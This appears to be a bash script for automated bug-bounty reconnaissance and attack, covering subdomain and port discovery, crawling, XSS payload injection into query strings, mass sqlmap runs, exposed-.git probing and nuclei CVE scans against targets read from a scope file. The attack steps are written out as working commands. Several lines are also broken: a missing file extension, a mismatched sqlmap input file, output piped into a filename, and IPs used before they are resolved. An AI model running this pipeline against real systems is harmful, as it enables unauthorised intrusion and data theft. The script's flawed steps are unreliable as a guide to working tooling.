#!/bin/bash

id="$1"
ppath="$(pwd)"

scope_path="$ppath/scope/$id"

timestamp="$(date +%s)"
scan_path="$ppath/scans/$id-$timestamp"

if [ ! -d "$scope_path" ]; then
    echo "Path doesn't exist"
    exit 1
fi

mkdir -p "$scan_path"
cd "$scan_path"


allports="80,443,81,300,591,593,832,981,1010,1311,1099,2082,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5280,5281,5601,5800,6543,7000,7001,7396,7474,8000,8001,8008,8014,8042,8060,8069,8080,8081,8083,8088,8090,8091,8095,8118,8123,8172,8181,8222,8243,8280,8281,8333,8337,8443,8500,8834,8880,8888,8983,9000,9001,9043,9060,9080,9090,9091,9200,9443,9502,9800,9981,10000,10250,11371,12443,15672,16080,17778,18091,18092,20720,32000,55440,55672"

####### START THE SCAN #######

## SET UP
echo "Starting scan against roots:"
cat "$scope_path/roots.txt"
cp -v "$scope_path/roots.txt" "$scan_path/roots.txt"


## SUBDOMAIN DISCOVERY
cat "$scan_path/roots.txt" | subfinder | anew subfinder.txt
findomain -f $scan_path/roots.txt -u findomain_subs.txt
cat subfinder.txt findomain_subs.txt | anew subs.txt
cat subs.txt | httpx -silent | anew 200http.txt
rm subfinder.txt findomain_subs.txt

## Wayback Discovery 
cat "$scan_path/roots.txt" | waybackurls | anew wayback.txt
cat "$scan_path/roots.txt" | gau | anew gau.txt
cat gau.txt wayback.txt | anew backdomains.txt
cat backdomains.txt | egrep -iv .jpg | egrep -iv .jpeg | egrep -iv .gif | egrep -iv .gif | egrep -iv .png | egrep -iv .css | anew filtredback.txt
cat 200http filtredback.txt | httpx -silent | anew old_and_new_subs.txt

cat old_and_new_subs.txt | grep ".pdf" | anew pdfDocuments.txt

## PORT SCANNING & HTTP Server Discovery
nmap -T4 -vv -iL "$scan_path/ips.txt" --top-ports 3000 -n --open -oX "$scan_path/nmap.xml"
tew -x "$scan_path/nmap.xml" -dnsx "$scan_path/dns.json" --vhost -o "$scan_path/hostport.txt" | httpx -json -o "$scan_path/http.json"
cat "$scan_path/ips.txt" | naabu -silent -ports $allports | httpx -silent | anew naabu200.txt
cat "$scan_path/http.json" | jq -r '.url' | sed -e 's/:80$//g' -e 's/:443$//g' | sort -u > "$scan_path/http.txt"

## HTTP Crawling
gospider -S "$scan_path/http.txt" --json | grep "{" | jq -r '.output?' | tee "$scan_path/crawl.txt" 

## JavaScript Pulling
cat "$scan_path/crawl.txt" | grep "\.js" | httpx -sr -srd js | anew js_2.txt
cat old_and_new_subs.txt | grep "\.js" | httpx -silent | anew js_1.txt
cat js_*.txt | anew CrawlingJS.txt; rm js_*.txt

### Vuln search

## XSS
cat old_and_new_subs.txt | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | notify -silent
cat old_and_new_subs.txt | gf xss | uro | qsreplace '">' | freq | egrep -v 'Not' | notify -silent

## Git Exposed
cat 200http.txt | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew git_result.txt

## SQLi Massive Files
cat old_and_new_subs.txt | gf sqli >> sqlisubs.txt | sqlmap -m sqli --batch --random-agent --level 1 | sqli_results_1.txt
cat 200http.txt | gf sqli >> slisubs2.txt | sqlmap -m sqli --batch --random-agent --level 1 | sqli_results_2.txt 
cat sqli_results_2.txt sqli_results_1.txt | anew sqli.txt; rm sqli_results_*.txt

## DNS RESOLUTION - RESOLVE DISCOVERED SUBDOMAINS
puredns resolve "$scan_path/200http.txt" -r "$ppath/lists/resolvers.txt" -w "$scan_path/resolved.txt" | wc -l
dnsx -l "$scan_path/resolved.txt" -json -o "$scan_path/dns.json" | jq -r '.a[]?' | anew "$scan_path/ips.txt" | wc -l

## CVEs
cat 200http.txt | nuclei -severity low,medium,high,critical -silent -o nuclei.txt -H "Kommandos" | notify -silent

### Add scan logic here

# Calculete the time diff
end_time=$(date +%s)
seconds="$(expr $end_time - $timestamp)"
time=""

if [[ "$seconds" -gt 59 ]]
then 
        minutes=$(expr $seconds / 60)
        time="$minutes minutes"
else
        time="$seconds seconds"
fi

echo "Scan $id took $time"
